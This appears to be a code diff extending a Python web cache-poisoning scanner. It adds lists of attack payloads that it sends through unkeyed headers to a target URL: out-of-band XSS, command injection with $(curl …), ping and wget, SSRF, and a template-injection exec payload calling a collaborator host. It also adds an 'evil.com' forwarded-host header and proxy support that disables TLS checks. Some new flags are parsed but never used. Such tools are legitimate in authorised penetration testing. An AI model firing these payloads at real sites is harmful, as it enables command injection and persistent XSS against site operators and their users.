@@ -17,10 +17,51 @@ class CacheTestResult:
     cache_hit_header: str
 
 class CachePoisonTester:
-    def __init__(self, target_url: str, verbose: bool = False):
+    def __init__(self, target_url: str, verbose: bool = False, test_xss: bool = False, 
+                 burp_collab_url: str = None, proxy: dict = None):
         self.target_url = target_url
         self.verbose = verbose
+        self.test_xss = test_xss
         self.session = requests.Session()
+        
+        # Configure proxy if provided
+        if proxy:
+            self.session.proxies = proxy
+            # Disable SSL verification when using Burp proxy
+            self.session.verify = False
+            # Suppress SSL warnings
+            import urllib3
+            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+        
+        self.burp_collab_url = burp_collab_url
+        
+        # Out-of-band payloads using Burp Collaborator
+        self.oob_payloads = [
+            # XSS with out-of-band detection
+            (f'"><img src=//{burp_collab_url}>', 'img-oob'),
+            (f'<script>fetch("//{burp_collab_url}")</script>', 'fetch-oob'),
+            
+            # Blind RCE attempts
+            (f'$(curl {burp_collab_url})', 'curl-oob'),
+            (f'`ping {burp_collab_url}`', 'ping-oob'),
+            (f'"|wget {burp_collab_url}', 'wget-oob'),
+            
+            # SSRF attempts
+            (f'http://{burp_collab_url}', 'ssrf-oob'),
+            (f'https://{burp_collab_url}', 'ssrf-https-oob'),
+            
+            # Template injection
+            ('{{getcookie("x")+"|"+exec("import socket;socket.gethostbyname(\''+burp_collab_url+'\')")}}', 'ssti-dns'),
+        ]
+        
+        # Safe test payloads for XSS detection
+        self.xss_payloads = [
+            ('<script>console.log(1)</script>', 'script injection'),
+            ('"><img src=x onerror=console.log(2)>', 'image onerror'),
+            ('\'-alert(3)-\'', 'quote escape'),
+            ('javascript:console.log(4)//', 'javascript protocol')
+        ]
+        
         # Headers that might influence caching but aren't included in cache key
         self.test_headers = {
             'X-Forwarded-Host': 'evil.com',
@@ -119,6 +160,30 @@ class CachePoisonTester:
 
         return vulnerable
 
+    def test_xss_payload(self, header: str, payload: str, payload_type: str) -> bool:
+        """Test if an XSS payload can be cached"""
+        try:
+            # Send the XSS payload
+            poison_headers = {header: payload}
+            r1 = self.session.get(self.target_url, headers=poison_headers)
+            
+            # Wait briefly for cache
+            time.sleep(2)
+            
+            # Check if payload was cached
+            r2 = self.session.get(self.target_url)
+            
+            if payload in r2.text:
+                print(f"[!] Potential XSS via {header} using {payload_type}")
+                print(f"[!] Payload: {payload}")
+                return True
+                
+        except Exception as e:
+            if self.verbose:
+                print(f"[!] Error testing XSS payload: {str(e)}")
+                
+        return False
+
     def verify_cache_poisoning(self, vulnerable_headers: List[str]) -> bool:
         """Verify if cache poisoning is possible with identified headers"""
         print("[*] Verifying cache poisoning possibility...")
@@ -149,6 +214,53 @@ class CachePoisonTester:
             except Exception as e:
                 print(f"[!] Error during verification: {str(e)}")
                 
+        return False
+
+    def test_injection_vectors(self, vulnerable_headers: List[str]) -> None:
+        """Test for XSS and other injection possibilities"""
+        print("[*] Testing for XSS and OOB vectors...")
+        
+        # Test Burp Collaborator payloads if URL is provided
+        if self.burp_collab_url:
+            print(f"[*] Testing OOB interactions with {self.burp_collab_url}")
+            print("[*] Check your Burp Collaborator client for interactions")
+            
+            for header in vulnerable_headers:
+                for payload, payload_type in self.oob_payloads:
+                    try:
+                        # Send the OOB payload
+                        poison_headers = {header: payload}
+                        r1 = self.session.get(self.target_url, headers=poison_headers)
+                        
+                        print(f"[+] Sent {payload_type} payload via {header}")
+                        print(f"    Payload: {payload}")
+                        
+                        # Wait briefly for cache
+                        time.sleep(2)
+                        
+                        # Check if payload was cached
+                        r2 = self.session.get(self.target_url)
+                        
+                        if payload in r2.text:
+                            print(f"[!] OOB payload was cached via {header}")
+                            print("[!] Check Burp Collaborator for delayed interactions")
+                            
+                    except Exception as e:
+                        if self.verbose:
+                            print(f"[!] Error testing OOB payload: {str(e)}")
+        
+        print("[*] Testing for XSS vectors...")
+        
+        for header in vulnerable_headers:
+            for payload, payload_type in self.xss_payloads:
+                if self.test_xss_payload(header, payload, payload_type):
+                    print(f"[!] Cached XSS possible with {header}")
+                    print("[!] This could lead to persistent XSS affecting multiple users")
+                    print("[*] Suggested fixes:")
+                    print("    - Include this header in the cache key")
+                    print("    - Implement proper output encoding")
+                    print("    - Add Content-Security-Policy headers")
+                    return True
         return False
 
     def run_test(self) -> None:
@@ -188,10 +300,29 @@ def main():
     parser = argparse.ArgumentParser(description='Test for web cache poisoning vulnerabilities')
     parser.add_argument('url', help='Target URL to test')
     parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
+    parser.add_argument('--xss', action='store_true', help='Test for XSS vectors')
+    parser.add_argument('--custom-payload', help='Test a custom payload for injection')
+    parser.add_argument('--burp-collab', help='Burp Collaborator URL for OOB testing')
+    parser.add_argument('--proxy', help='Proxy URL (e.g., http://127.0.0.1:8080)')
+    parser.add_argument('--https-proxy', help='HTTPS Proxy URL (if different from HTTP proxy)')
     args = parser.parse_args()
 
     try:
-        tester = CachePoisonTester(args.url, args.verbose)
+        # Configure proxy settings
+        proxy_config = None
+        if args.proxy:
+            proxy_config = {
+                'http': args.proxy,
+                'https': args.https_proxy or args.proxy
+            }
+            print(f"[*] Using proxy: {proxy_config}")
+
+        tester = CachePoisonTester(
+            args.url, 
+            verbose=args.verbose,
+            burp_collab_url=args.burp_collab,
+            proxy=proxy_config
+        )
         tester.run_test()
     except KeyboardInterrupt:
         print("\n[!] Test interrupted by user")
